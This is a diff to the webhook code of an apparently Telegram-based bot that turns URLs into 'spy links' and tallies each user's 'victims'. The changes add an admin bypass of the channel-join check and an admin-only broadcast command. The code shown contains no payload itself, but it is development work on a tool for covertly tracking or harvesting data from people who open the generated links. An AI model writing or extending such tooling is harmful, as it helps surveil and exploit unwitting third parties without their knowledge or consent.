@@ -22,12 +22,10 @@ def webhook():
         return 'OK', 200
 
     try:
-        # ---- Callbacks ----
         cb = update.get('callback_query')
         if cb:
             return _handle_callback(cb)
 
-        # ---- Messages ----
         msg = update.get('message')
         if not msg:
             return 'OK', 200
@@ -48,6 +46,9 @@ def _handle_callback(cb):
 
     # Force-join recheck
     if data == 'check_join':
+        if is_admin(from_id):
+            send_message(from_id, "✅ Admin verified! Send any URL to create a spy link.", parse_mode=None)
+            return 'OK', 200
         ok, missing = check_force_join(from_id)
         if ok:
             send_message(from_id, "✅ Verified! Send any URL to create a spy link.", parse_mode=None)
@@ -72,6 +73,13 @@ def _handle_callback(cb):
         send_message(from_id,
                      f"📊 Your victims: {len(mine)}\n🔗 Your links: {len(my_links)}",
                      parse_mode=None)
+
+    elif data == 'broadcast':
+        if not is_admin(from_id):
+            send_message(from_id, "❌ Admin only.", parse_mode=None)
+            return 'OK', 200
+        _pending[from_id] = 'broadcast'
+        send_message(from_id, "📢 Send the message to broadcast. /cancel to abort.", parse_mode=None)
 
     elif data == 'users':
         if not is_admin(from_id):
